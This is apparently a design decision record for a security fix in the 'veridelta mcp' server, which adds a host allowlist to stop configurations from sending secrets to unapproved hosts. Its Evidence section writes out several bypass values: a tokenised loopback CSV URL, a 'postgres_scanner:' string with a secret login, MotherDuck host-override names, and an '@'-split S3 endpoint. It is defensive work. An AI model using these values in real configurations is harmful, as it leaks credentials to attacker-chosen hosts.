**Claim:** `veridelta mcp` refuses, before it connects, a side that names a host not given with `--allow-host`: a URL's host, a bucket, a database server, a Snowflake account's host, a Databricks workspace, or an endpoint, a bucket, or an account in `storage_options`. It also refuses a setting whose host it cannot check: a `storage_options` key outside the credentials, regions, endpoints, buckets, and account names it knows, a BigQuery `credentials_path`, a database `uri` with an `@` outside its login or a `#`, a MotherDuck option other than `attach_mode`, `saas_mode`, and `session_name`, a MotherDuck name, before the `?`, with a character other than a letter, a digit, `_`, `-`, and `/`, and a DuckDB `database` that DuckDB opens through an extension, such as `postgres_scanner:host=db`. It reads a host only from text in one shape, DNS labels or an IP address in ASCII with at most a port of digits, and refuses a location, an endpoint, a bucket, an account, or a workspace with a login, an `@`, or a `%`, a `\`, a space, a control character, or a letter outside ASCII in its host. A database `uri` may hold one login before its host. It matches schemes and the MotherDuck prefix in ASCII only. Every location with a scheme of two or more characters names a host, other than a local scheme (`file`, `fs`, `opendal+fs`) and a service's own (`hf`, `md`, `motherduck`), so a scheme the server has no list of, such as `hdfs` or `s3n`, still needs its host allowed. Every location but MotherDuck's is also checked as a path under the roots, since Polars and DuckDB open a scheme they do not know as a file. `validate_config` loads the file once and checks the same objects it connects with. With no `--allow-host`, a tool reads only files under the roots, MotherDuck, Hugging Face, and BigQuery with the server's own credentials. The check covers the hosts the configuration names, not those in a table's metadata or behind a redirect. The command line is unchanged.

**Evidence:** `_destinations` and `_refuse_hosts` in `src/veridelta/mcp_server.py`, called from `_load` and from `check_configuration` with `schemas`. `TestAllowedHosts` in `tests/unit/test_mcp_server.py` refuses each kind of host, including a loopback URL, a link-local address, a second Postgres host, a `host=` query parameter, an authority with a backslash, and a Postgres login written in the path, which tokio-postgres reads up to the first `@` anywhere. The same test refuses `hdfs://`, `sftp://`, `opendal+s3://`, and Iceberg `s3n://` locations, and `hdfs:///t`, which names no host. `test_it_checks_the_configuration_it_connects_with` swaps the file right after the one load, and the check still uses the file it loaded. `test_it_refuses_a_setting_whose_host_it_cannot_check` refuses a PyIceberg `gcs.service.host`, an `adls.dfs-storage-authority`, an emulator switch, a BigQuery key file, whose `token_uri` names the host the sign-in goes to, a MotherDuck `motherduck_host` or `motherduck_port`, in the options or after a `&`, a `#`, or a `;` in the name, and a DuckDB `database` of `postgres_scanner:`, `mysql_scanner:`, or `sqlite_scanner:`. Before the change, a configuration under a root with `path: http://127.0.0.1:8799/x.csv?t=${DEMO_TOKEN}` made `describe_schema` send the token to that server, and a Postgres `uri` sent it to a host the configuration named. Masking kept it out of the answer only. Before the location rule covered every scheme, a Delta `table_uri` of `hdfs://127.0.0.1:PORT/${DEMO_SECRET}/t` opened a connection to that port, since the server read an unknown scheme as a path on this machine. Before `validate_config` loaded the file once, swapping it between the host check and the second load sent a Postgres login holding the secret to loopback. Before the DuckDB rules, a `database` of `postgres_scanner:host=127.0.0.1 port=PORT user=${DEMO_SECRET}` sent that login to loopback, since Python reads no scheme with an `_` and DuckDB loads the extension when it opens the database, before the sandbox applies. Opening with `autoload_known_extensions` off does not stop that load. And `md:?motherduck_host=127.0.0.1&motherduck_use_tls=false` made MotherDuck's extension send its first request to 127.0.0.1. Before the whole MotherDuck name was checked, `md:x&motherduck_host=127.0.0.1&motherduck_use_tls=false` and the same with `#` did too, since the check read options only after the `?`. Before the host's shape was checked, an Iceberg `s3.endpoint` of `http://127.0.0.1:PORT@minio.internal` passed with `minio.internal` allowed, since `urlsplit` reads the host after the `@`, and PyArrow's S3 client, which ends the host at the first `:`, sent `HEAD /data/${DEMO_SECRET}/metadata/v1.metadata.json` to 127.0.0.1. `test_it_refuses_a_host_written_in_a_shape_readers_split_differently` covers that endpoint, the same in Delta's `aws_endpoint_url`, a login, an `@`, a `%`, a tab, or a letter outside ASCII in a location, an endpoint, a database `uri`, a Snowflake account, or a Databricks workspace. A `database` of `motherduck:x` with the Kelvin sign, U+212A, for its `k` counted as MotherDuck before, so its path was not checked, though DuckDB opens it as a file.

**Alternative considered:** Resolve each host and refuse loopback, link-local, and private addresses, and expand `${NAME}` only in credential fields such as `password` and `access_token`.

**Why rejected:** A public host the agent chooses still receives a credential field during login, so the secret leaves anyway. Resolving before the driver connects is open to DNS rebinding, and object store options such as an endpoint or a proxy would need their own resolution. An allowlist compares names the operator wrote, and no configuration can widen it. Readers take more host options than any list of key endings covers, so a tool passes on only the keys it knows, and refuses the rest. The same holds for schemes: a list of remote schemes misses whatever a reader adds, such as Delta Lake's `hdfs`, `sftp`, and every `opendal+` scheme, so the server lists only the local and the service schemes and holds every other one to the allowed hosts. MotherDuck's options follow the storage options rule: a tool passes on only the few it knows choose no host. The extension finds options in more places than after the `?`, so the name before it passes only as the characters a database or share name uses, not with a list of separators to refuse. Hosts follow the same rule: PyArrow's AWS SDK, DuckDB, httplib, object_store, tokio-postgres, and ConnectorX each split an authority their own way, so matching any one parser's handling of `@`, `%`, or `\` leaves the others. Only text that every one of them reads as the same host and port passes. That refuses an Azure `abfss://container@account` location, which `az://container/t` with the account in `storage_options` replaces.

**How to reverse:** Remove the `_refuse_hosts` calls in `src/veridelta/mcp_server.py`, the `--allow-host` flag in `src/veridelta/cli.py`, and `TestAllowedHosts`, and restore the sentence in `docs/agents.md` that remote data is read as the command line reads it.
